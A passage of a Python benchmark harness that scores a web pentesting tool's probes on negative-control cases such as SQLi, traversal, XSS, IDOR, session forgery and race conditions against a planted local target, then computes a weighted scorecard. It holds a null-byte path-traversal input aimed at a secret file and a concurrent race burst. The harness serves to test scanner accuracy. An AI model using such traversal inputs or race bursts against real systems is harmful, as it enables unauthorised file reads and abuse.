# N01 login is parameterized. Measured by running the tool's SQLi probe, not by
# sending payloads by hand -- the point is whether the TOOL reports a finding here.
leaked, _ev = _probe_says("N01", _ptxprobes.probe_sqli, "/login", "username")
record("N01", "SQLi on /login (parameterized)", "absent", False,
       "probe_sqli -> " + _ev, "parameterized query — no injection")

# N02 null byte traversal, via the tool's own traversal probe.
ok, _ev = _probe_says("N02", _ptxprobes.probe_traversal, "/download", "file",
                      "../canary/secret.txt\x00.txt", "PTX_TRAVERSAL_GOAL")
record("N02", "Null-byte traversal truncation", "absent", False,
       "probe_traversal -> " + _ev, "modern Python rejects; no truncation")

# N03 XSS via a JSON API. The old version pointed at /api/invoices/1001, which reflects
# nothing at all -- so the probe reported clean whether or not its Content-Type check
# existed, and the guard was never exercised. /api/echo reflects the payload and serves
# it as application/json, which is the case the check exists for.
renderable, _ev = _probe_says("N03", _ptxprobes.probe_xss, "/api/echo", "text")
record("N03", "XSS reflected into a JSON response", "absent", False,
       "probe_xss -> " + _ev, "JSON content type is not rendered as HTML by browsers")

# N04 command injection where there is no command. This used to point at /api/ping,
# which is exactly the endpoint V04 plants injection in (`;` works even though `&&` does
# not) -- so the probe reporting it was a TRUE positive being scored as a false one.
# /api/echo touches no subprocess, so a finding here would be a genuine false positive.
ok, _ev = _probe_says("N04", _ptxprobes.probe_cmdi, "/api/echo", "text")
record("N04", "Command injection on an endpoint that runs no command", "absent", False,
       "probe_cmdi -> " + _ev, "/api/echo is a pure JSON echo; nothing is executed")

# N05 CORS alone is not Critical.
#
# This oracle used to hardcode found=False. It computed `ok` from the response headers and
# then never used it, so the case recorded CORRECT_NEGATIVE no matter what the tool did —
# a falsification target that cannot fail is not a test. It is now measured by running the
# tool's own probe and reading the severity it actually assigns.
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ptx"))
try:
    from ptxlib import probes as _ptxprobes
    _h = _ptxprobes.Http(BASE, rps=30)
    _v = _ptxprobes.probe_cors(_h, "/")
    _sev = _v.get("severity")
    # "found" means the tool inflated a standalone CORS finding to Critical or High.
    _inflated = bool(_v.get("vulnerable")) and _sev in ("Critical", "High")
    TOOL["N05"] = _inflated
except Exception as _e:
    _sev, _inflated = f"probe error: {_e}", False
record("N05", "CORS reported as standalone Critical", "absent", False,
       f"probe_cors -> vulnerable={_v.get('vulnerable') if '_v' in dir() else '?'} "
       f"severity={_sev}",
       "real misconfiguration, but exploitable only with a victim browser — Medium at most")

# N06 a handler-level session check is not a path-based ACL. Every normalisation variant of
# /api/me is refused because the check runs inside the handler after routing, so there is no
# spelling of the URL that reaches it. Reporting a bypass here would be a false positive
# against a control that is working exactly as intended.
_bypassed, _ev = _probe_says("N06", _ptxprobes.probe_acl_bypass, "/api/me",
                             "sid=%s" % SID_A)
record("N06", "ACL bypass reported on a handler-level session check", "absent", False,
       "probe_acl_bypass -> " + _ev,
       "the 401 comes from the handler, not from a path rule, so no re-spelling bypasses it")

# N07 the correctly written twin of V26. Same shape, same echoed boolean, same
# endpoint style -- but unknown keys are rejected against an allowlist. A probe that
# reports this one is not detecting mass assignment, it is detecting any create
# endpoint that echoes a record.
try:
    _sh = _ptxprobes.Http(BASE, rps=30)
    _sv = _ptxprobes.probe_mass_assignment_fields(
        _sh, "/api/guestbook-safe", "/api/guestbook-safe", None,
        {"author": "ptx", "message": "x"}, marker_field="message")
    _sflagged = bool(_sv.get("vulnerable"))
    TOOL["N07"] = _sflagged
    _sev2 = (f"discover={_sv.get('gated_fields')} vulnerable={_sv.get('vulnerable')} "
             f"hits={len(_sv.get('hits') or [])}")
except Exception as _e:
    _sflagged, _sev2 = False, f"probe error: {_e}"
record("N07", "Mass assignment on the allowlisted guestbook twin", "absent", False,
       _sev2, "allowlist rejects unknown keys regardless of value")

# N08 a public object that is ID-scoped and carries a _id field. Reading ID 2 as
# user A is not an authorisation failure -- no session is needed at all. The probe's
# anonymous control request is what distinguishes this from V27.
try:
    _ah = _ptxprobes.Http(BASE, rps=30)
    _av = _ptxprobes.probe_idor(_ah, "/api/articles", 1, 2, cookie="sid=%s" % SID_A)
    _aflagged = bool(_av.get("vulnerable"))
    TOOL["N08"] = _aflagged
    _aev = (f"vulnerable={_av.get('vulnerable')} markers={_av.get('ownership_markers')} "
            f"inconclusive={_av.get('inconclusive')}")
except Exception as _e:
    _aflagged, _aev = False, f"probe error: {_e}"
record("N08", "IDOR on a public ID-scoped object", "absent", False, _aev,
       "readable anonymously, so authentication was never the gate")

# N09 the same guestbook with a correctly signed session. Identical route shape,
# identical role check, identical gated field -- but the token carries an HMAC the
# client cannot produce. A probe that flags this is detecting "a cookie that decodes
# to JSON", which is not forgery.
try:
    _gh = _ptxprobes.Http(BASE, rps=30)
    _gg, _, _ = _ptxprobes.discover_gated_fields(
        _gh, "/api/guestbook-signed", "/api/guestbook-signed", None,
        {"author": "ptx", "message": "x"}, marker_field="message")
    _gpriv = ([{"path": "/api/guestbook-signed",
                "body": {"author": "ptx", "message": "x", _gg[0][0]: True}}] if _gg else [])
    _gv = _ptxprobes.probe_session_forge(
        _gh, ["/api/guestbook-signed"], seed_path="/api/guestbook-signed",
        method="POST", post_body={"author": "ptx", "message": "x"},
        privileged_requests=_gpriv)
    _gflagged = bool(_gv.get("vulnerable"))
    TOOL["N09"] = _gflagged
    _gev = ("vulnerable=%s tokens=%s attempts=%s"
            % (_gv.get("vulnerable"), _gv.get("decoded_tokens"), _gv.get("attempts")))
except Exception as _e:
    _gflagged, _gev = False, "probe error: %s" % _e
record("N09", "Session forgery on a correctly signed token", "absent", False, _gev,
       "HMAC verified server-side; forged claims are ignored")


tool("N10", _ptxprobes.probe_confused_deputy, _H, "/proxy/safe", upstream=BASE + "/api/upstream")
tool("N11", _ptxprobes.probe_confused_deputy, _H, "/proxy/stale", upstream=BASE + "/api/upstream")
record("N11", "Confused deputy reported on a stale/lying cache proxy", "absent", False,
       "/proxy/stale answers 200 even for impossible paths, so its data is not live",
       "a lying cache must be declined by the liveness control, not reported as a breach")
record("N10", "Confused deputy reported on a proxy that spends no credential", "absent", False,
       "/proxy/safe forwards without the credential and matches the upstream's 401",
       "a proxy that does not spend a credential must not be reported")

_sr = req("/api/checkout-safe", "POST", {"price": 10, "qty": 1, "discount": 150})
_sflaw = _sr["code"] == 200 and json.loads(_sr["body"] or "{}").get("total", 1) < 0
tool("N12", _ptxprobes.probe_constraint_logic, _H, "/api/checkout-safe",
     {"price": (1, 100), "qty": (1, 10), "discount": (0, 200)},
     _logic_impossible, _logic_verify, baseline={"price": 10, "qty": 1, "discount": 0})
record("N12", "checkout-safe refuses the solved over-100% discount", "absent", _sflaw,
       "the same solved input is rejected (HTTP 400), so no invariant is broken",
       "a server that enforces the invariant must not be reported by the solver probe")

_sc = req("/api/safe-config")
try:
    _sc_tok = json.loads(_sc["body"] or "{}").get("access_token", "")
except Exception:
    _sc_tok = ""
_sc_flaw = _sc["code"] == 200 and len(_sc_tok) >= 16 and "your" not in _sc_tok.lower()
tool("N13", _ptxprobes.probe_response_credential_leak, _H, "/api/safe-config")
record("N13", "Placeholder token field is not a credential leak", "absent", _sc_flaw,
       "/api/safe-config returns access_token='your_token_here' (a placeholder, not a secret)",
       "a placeholder/example value must not be reported as a leaked credential")

# N14 CONTROL - the same one-time credit, but guarded: the second claim is refused (409), so the
# balance moves once. probe_double_spend must decline.
_s0 = json.loads(req("/api/wallet-safe")["body"] or "{}").get("balance")
req("/api/claim-once", method="POST")
_s1 = json.loads(req("/api/wallet-safe")["body"] or "{}").get("balance")
req("/api/claim-once", method="POST")
_s2 = json.loads(req("/api/wallet-safe")["body"] or "{}").get("balance")
_n14_flaw = None not in (_s0, _s1, _s2) and (_s1 - _s0) != 0 and (_s2 - _s1) != 0
tool("N14", _ptxprobes.probe_double_spend, _H, "/api/wallet-safe",
     action_path="/api/claim-once", state_field="balance")
record("N14", "Guarded one-time credit refuses the replay", "absent", _n14_flaw,
       "/api/claim-once credits once then returns 409; the balance does not move again",
       "a server that makes the one-time effect idempotent must not be reported as double-spend")

# N15 CONTROL - the same 8-way burst against an ATOMIC single-use guard: exactly one racer is
# credited, so the state moves by one unit and probe_race_consume must decline.
req("/benchmark/rearm-race", "POST", {})
_sb0 = json.loads(req("/api/race-wallet-safe")["body"] or "{}").get("balance")
def _race_hit_safe():
    req("/api/race-redeem-safe", "POST", {}, timeout=25)
_sths = [threading.Thread(target=_race_hit_safe) for _ in range(8)]
[t.start() for t in _sths]; [t.join() for t in _sths]
_sb1 = json.loads(req("/api/race-wallet-safe")["body"] or "{}").get("balance")
_n15_flaw = (_sb1 - _sb0) > 50
req("/benchmark/rearm-race", "POST", {})
tool("N15", _ptxprobes.probe_race_consume, _H, "/api/race-wallet-safe",
     action_path="/api/race-redeem-safe", state_field="balance", unit=50, n=8)
record("N15", "Atomic single-use guard holds under an 8-way concurrent burst", "absent", _n15_flaw,
       "the check and commit are one locked critical section, so exactly one racer is credited",
       "a correct atomic guard must not be reported as a race")

# ---- scoring ----
# A 401 on an endpoint the session already reached successfully means the session died
# mid-run, not that the vulnerability is absent. Detected the same way transport failures
# are: by refusing to present the score as a detection result.
SESSION_LOST = []
for _r in results:
    _ev = str(_r.get("evidence", ""))
    if "auth required" in _ev or "-> HTTP 401" in _ev or "-> 401" in _ev:
        SESSION_LOST.append(_r["id"])

W = {"TARGET_BROKEN": -6, "TRUE_POSITIVE": 3, "FALSE_POSITIVE": -4, "FALSE_NEGATIVE": -2, "CORRECT_NEGATIVE": 1}
tp = sum(1 for r in results if r["status"] == "TRUE_POSITIVE")
fn = sum(1 for r in results if r["status"] == "FALSE_NEGATIVE")
fp = sum(1 for r in results if r["status"] == "FALSE_POSITIVE")
cn = sum(1 for r in results if r["status"] == "CORRECT_NEGATIVE")
planted = tp + fn; absent = cn + fp
score = sum(W[r["status"]] for r in results)
maxscore = planted * 3 + absent * 1

out = {
    "target": BASE, "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    "counts": {"true_positive": tp, "false_negative": fn, "false_positive": fp,
               "correct_negative": cn, "planted_total": planted, "absent_total": absent},
    "rates": {"detection": round(tp / planted, 3) if planted else None,
              "false_positive": round(fp / (fp + cn), 3) if (fp + cn) else None,
              "precision": round(tp / (tp + fp), 3) if (tp + fp) else None},
    "transport_failures": len(TRANSPORT_FAILURES),
    "session_lost": SESSION_LOST,
    "score": {"weighted": score, "max_possible": maxscore,
              "normalised": round(score / maxscore, 3) if maxscore else None},
    "weights": W, "results": results,
}
save("scorecard.json", out)

# A 401 on an endpoint the session already reached successfully means the session died
# mid-run, not that the vulnerability is absent. Detected the same way transport failures
# are: by refusing to present the score as clean.
if SESSION_LOST:
    print(f"\n\033[31m=== INSTRUMENTATION WARNING ===\033[0m")
    print(f"{len(SESSION_LOST)} oracle(s) got 'auth required': {', '.join(SESSION_LOST)}")
    print("The session died mid-run, so these were recorded as FALSE NEGATIVES when the")
    print("vulnerability may well be present. Do not treat this score as a detection")
    print("result. Likely causes: the target restarted (reloader), or something called")
    print("/benchmark/reset during the run.\n")

if TRANSPORT_FAILURES:
    print(f"\n\033[31m=== INSTRUMENTATION WARNING ===\033[0m")
    print(f"{len(TRANSPORT_FAILURES)} request(s) failed at the transport layer, so some")
    print("oracles observed no response and recorded a FALSE NEGATIVE. The score below")
    print("understates detection and must not be compared against a clean run.")
    for f in TRANSPORT_FAILURES[:5]:
        print(f"  {f['path']}: {f['error'][:90]}")
    if len(TRANSPORT_FAILURES) > 5:
        print(f"  ... and {len(TRANSPORT_FAILURES) - 5} more")
    print("Re-run against a target that is not being edited or concurrently probed.\n")

print(f"\n\033[1m=== SCORECARD ===\033[0m")
print(f"  planted found      : {tp}/{planted}   detection rate {out['rates']['detection']}")
print(f"  absent correctly   : {cn}/{absent}   false-positive rate {out['rates']['false_positive']}")
print(f"  precision          : {out['rates']['precision']}")
print(f"  weighted score     : {score} / {maxscore}  ({out['score']['normalised']})")
if fn: print("  MISSED  :", ", ".join(r["id"] for r in results if r["status"] == "FALSE_NEGATIVE"))
if fp: print("  FALSELY REPORTED:", ", ".join(r["id"] for r in results if r["status"] == "FALSE_POSITIVE"))
print(f"  artefacts -> {ART}/scorecard.json\n")
